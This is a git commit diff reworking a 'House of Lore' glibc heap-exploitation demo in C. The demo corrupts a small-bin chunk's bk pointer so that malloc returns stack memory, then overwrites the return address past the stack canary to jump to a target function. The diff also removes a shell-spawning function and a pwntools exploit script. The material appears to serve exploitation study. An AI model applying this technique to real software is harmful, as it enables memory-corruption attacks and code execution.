a95963ceb8aa08e9fcd3dc726802b1db146f129d
__asm("mov ip, 0x0") <66553758+ilikerust@users.noreply.github.com>
2022-10-18 19:49:41 +0300

    house_of_lore

--- house_of_lore/house_of_lore.c
+++ house_of_lore/house_of_lore.c
@@ -1,93 +1,78 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <unistd.h>
+#include <stdint.h>
+#include <assert.h>
 
-void shell() {
-    system("/bin/sh");
-}
+void jackpot(){ fprintf(stderr, "Nice jump d00d\n"); exit(0); }
 
-int main() {
-    unsigned long long fake1[4];
-    unsigned long long fake2[4];
-    void *fake_freelist[7][4];
-    void *tcache_fillers[7];
-    int i;
+int main(int argc, char * argv[]){
+    intptr_t* stack_buffer_1[4] = {0};
+    intptr_t* stack_buffer_2[4] = {0};
+    void* fake_freelist[7][4];
 
-    unsigned long long* target = malloc(0x100);
-    unsigned long long* target_chunk = target - 2; // points to target's beginning
+    intptr_t *victim = malloc(0x100);
+    printf("Our victim chunk %p\n", victim);
 
-    for(i = 0; i < 7; i++) {
-        tcache_fillers[i] = malloc(0x100);
-    }
+    // Prepare tcache fill
+    void *dummies[7];
+    for(int i=0; i<7; i++) dummies[i] = malloc(0x100);
 
-    // create a fake list of free chunks (set the bk field of fake_freelist[i] to 
-    // fake_freelist[i+1])
-    // with the exception of fake_freelist[6]->bk = NULL
-    for(i = 0; i < 6; i++) {
+    // victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk
+    intptr_t *victim_chunk = victim-2;
+
+    printf("stack_buffer_1 at %p\n", stack_buffer_1);
+    printf("stack_buffer_2 at %p\n", stack_buffer_2);
+
+    for(int i=0; i<6; i++) {
         fake_freelist[i][3] = fake_freelist[i+1];
-        printf("L[%d]: %p -> %p\n", i, &fake_freelist[i], fake_freelist[i + 1]);
     }
     fake_freelist[6][3] = NULL;
+    printf("fake free-list at %p\n", fake_freelist);
 
-    // fake1 -> prev_size = 0, fake1->size = 0x20, fake1->fd = target_chunk
-    fake1[0] = 0;
-    fake1[1] = 0x20;
-    fake1[2] = (unsigned long long)target_chunk;
+    // stack_buffer_1->fd = victim_chunk
+    stack_buffer_1[0] = 0;
+    stack_buffer_1[1] = 0;
+    stack_buffer_1[2] = victim_chunk;
 
-    // To bypass security checks, assign fake2->fd = fake1 and fake1->bk = fake2
-    fake1[3] = (unsigned long long)fake2;
-    fake2[2] = (unsigned long long)fake1;
+    // stack_buffer_1->bk = stack_buffer_2
+    stack_buffer_1[3] = (intptr_t*)stack_buffer_2;
+    // stack_buffer_2->fd = stack_buffer_1
+    stack_buffer_2[2] = (intptr_t*)stack_buffer_1;
 
-    // set the bk field of fake2 to the fake list of free chunks
-    // this is done to avoid the tcache-to-smallbin mechanism
-    // (this justifies the length 7 fake list)
-    fake2[3] = (unsigned long long)fake_freelist[0];
+    // stack_buffer_2->bk = fake_freelist ; prevent crash at smallbin_to_tcache mechanism
+    stack_buffer_2[3] = (intptr_t *)fake_freelist[0];
 
-    // Allocating a big enough chunk to avoid consolidating the top chunk
-    malloc(1000);
+    // avoid consolidation top chunk
+    void *p5 = malloc(1000);
 
-    // Now, before free()'ing our target chunk, it is important to fill up the tcache
-    // so we'll free our tcache fillers 
-    for(i = 0; i < 7; i++) {
-        free(tcache_fillers[i]);
-    }
+    // Fill up tcache
+    for(int i=0; i<7; i++) free(dummies[i]);
 
-    // When free()'ing the victim chunk, it'll be placed in the unsorted bin
-    free(target);
-    // Now, target's fd and bk are equal to the address of the unsorted bin
+    // Put victim chunk in unsorted bin
+    free((void*)victim);
 
-    // We invoke malloc with a value that is big enough to 
-    // force the unsorted bin to be sorted
-    malloc(1200);
-    // Now, our target resides in the small bin
+    // Force sort of the unsorted bin
+    void *p2 = malloc(1200);
 
-    // This is the tricky part of this attack.
-    // We need to have a way to overwrite target_chunk->bk with the address of fake1
-    target_chunk[3] = (unsigned long long)fake1;
-    printf("XX %p\n", fake1);
-    // At this point, the small bin should be as follows (-> goes in the bk direction):
-    // target -> fake1 -> fake2 -> [fake_freelist (1->...->6)]
+    // Vuln victim->bk = stack_buffer_1
+    victim[1] = (intptr_t)stack_buffer_1;
 
-    // We now wish to empty the tcache, for we want allocations to come from the small bin
-    for(i = 0; i < 7; i++) {
-        malloc(0x100);
-    }
+    // Clean tcache
+    for(int i=0; i<7; i++) malloc(0x100);
 
-    // Allocating an additional chunk that should return the address of target
-    printf("%p,%p::: %p\n", target_chunk[2], target_chunk[3], malloc(0x100));
-    printf("###%p %p\n", target_chunk, fake2);
+    // malloc will retrive victim ; here bin->bk == victim and the tcache is filled with 7 smallbin chunks
+    void *p3 = malloc(0x100);
 
-    // The next mallocs will now return an address on the stack
+    // next malloc will return fake_freelist[5] (fake_freelist[6] prevents smallbin corruption failure)
+    char *p4 = malloc(0x100);
 
-    for(i = 0; i < 7; i++) {
-        target = malloc(0x100);
-    }
-    // target = malloc(0x100);
-    printf("target: %p\n", ((char*)target - 0x10));
-    printf("fake1: %p %p\n", &fake1[2], malloc(0x100));
-    printf("after this long and unrelated sequence of malloc()'s and free()'s,");
-    printf("I can trust you to write into this buffer, which resides in the heap\n");
-    read(0, target, 0x100);
-    return 0;
+    printf("p4 is %p and should be on the stack!\n", p4);
+    intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode
+
+    long offset = (long)__builtin_frame_address(0) - (long)p4;
+    memcpy((p4+offset+8), &sc, 8); // This bypasses stack-smash detection since it jumps over the canary
+
+    // sanity check
+    assert((long)__builtin_return_address(0) == (long)jackpot);
 }
--- house_of_lore/pwnlore.py
+++
@@ -1,9 +0,0 @@
-from pwn import *
-
-p = process(['./house_of_lore'])
-gdb.attach(p)
-
-print(p.recvuntil(b'the heap\n').decode('UTF-8'))
-p.sendline(b'A' * 56 + p64(0x4011de)) # padding + address of shell
-
-p.interactive()
